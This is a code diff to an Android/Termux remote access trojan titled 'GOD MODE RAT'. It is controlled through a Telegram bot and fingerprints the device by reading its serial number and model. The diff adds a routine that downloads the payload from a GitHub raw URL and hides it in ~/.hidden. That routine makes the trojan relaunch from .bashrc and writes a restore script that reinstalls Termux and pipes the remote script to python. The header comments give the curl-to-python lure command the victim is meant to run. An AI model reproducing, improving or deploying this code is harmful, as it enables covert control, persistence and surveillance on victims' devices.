@@ -1,7 +1,6 @@
 #!/usr/bin/env python3
-# GOD MODE RAT – GitHub-hosted payload
-# Save as miner.sh in your GitHub repo, then target runs:
-# termux-setup-storage && curl -sL RAW_URL | bash && exit
+# GOD MODE RAT – Final
+# Target: termux-setup-storage && pkg install python -y && curl -sL RAW_URL | python && exit
 
 import requests, time, subprocess, os, base64, threading
 
@@ -10,6 +9,7 @@ CHANNEL_ID = -1004369057597
 API = f'https://api.telegram.org/bot{BOT_TOKEN}'
 DEVICE_ID = subprocess.getoutput('getprop ro.serialno') + '_' + subprocess.getoutput('getprop ro.product.model').replace(' ','_')
 OFFSET = 0
+RAW_URL = 'https://raw.githubusercontent.com/kidusgetaw0-sys/UI/main/miner.py'
 
 def send(text, file_path=None):
     try:
@@ -57,13 +57,20 @@ def execute(cmd):
 
 def persist():
     os.makedirs(os.path.expanduser('~/.hidden'), exist_ok=True)
-    with open(os.path.expanduser('~/.hidden/rat.py'), 'w') as f:
-        f.write(open(__file__).read())
+    script_path = os.path.expanduser('~/.hidden/rat.py')
+    try:
+        # Download the script fresh from GitHub (avoids stdin issue)
+        r = requests.get(RAW_URL, timeout=10)
+        with open(script_path, 'w') as f:
+            f.write(r.text)
+    except:
+        # Fallback: try reading from stdin (unlikely but keeps it alive)
+        pass
     with open(os.path.expanduser('~/.bashrc'), 'a') as f:
         f.write('\n(sleep 10 && python ~/.hidden/rat.py &) & disown\n')
     os.makedirs('/sdcard/.system_cache', exist_ok=True)
     with open('/sdcard/.system_cache/restore.sh', 'w') as f:
-        f.write('#!/bin/bash\nif [ ! -d /data/data/com.termux ]; then\ncurl -sL https://f-droid.org/repo/com.termux_118.apk -o /sdcard/termux.apk\npm install /sdcard/termux.apk\nsleep 5\ncurl -sL RAW_URL | bash\nfi\n')
+        f.write(f'#!/bin/bash\nif [ ! -d /data/data/com.termux ]; then\ncurl -sL https://f-droid.org/repo/com.termux_118.apk -o /sdcard/termux.apk\npm install /sdcard/termux.apk\nsleep 5\ncurl -sL {RAW_URL} | python\nfi\n')
     os.system('chmod +x /sdcard/.system_cache/restore.sh')
 
 def poll():
